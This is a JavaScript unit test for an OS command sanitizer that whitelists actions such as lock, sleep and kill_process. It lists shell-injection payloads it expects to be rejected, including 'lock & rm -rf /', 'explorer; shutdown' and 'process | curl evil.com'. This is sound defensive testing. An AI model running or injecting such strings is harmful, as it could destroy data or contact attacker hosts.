import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { sanitizeCommand, InvalidCommandError } from '../src/utils/sanitizer.js';

describe('OS Command Sanitization', () => {
  test('permits valid whitelisted actions', () => {
    assert.doesNotThrow(() => sanitizeCommand('lock'));
    assert.doesNotThrow(() => sanitizeCommand('sleep'));
  });

  test('permits valid process target for kill_process', () => {
    assert.doesNotThrow(() => sanitizeCommand('kill_process', 'notepad.exe'));
    assert.doesNotThrow(() => sanitizeCommand('kill_process', 'node'));
  });

  test('rejects shell injection attempts in action', () => {
    const payloads = [
      'lock & rm -rf /',
      'sleep; whoami',
      'lock | calc.exe',
      'lock && notepad'
    ];
    payloads.forEach(input => {
      assert.throws(
        () => sanitizeCommand(input),
        InvalidCommandError,
        `Expected ${input} to throw InvalidCommandError`
      );
    });
  });

  test('rejects shell injection attempts in kill target', () => {
    const maliciousTargets = [
      'notepad.exe & calc.exe',
      '..\\..\\payload',
      'explorer; shutdown',
      'process | curl evil.com'
    ];
    maliciousTargets.forEach(target => {
      assert.throws(
        () => sanitizeCommand('kill_process', target),
        InvalidCommandError,
        `Expected target ${target} to throw InvalidCommandError`
      );
    });
  });
});
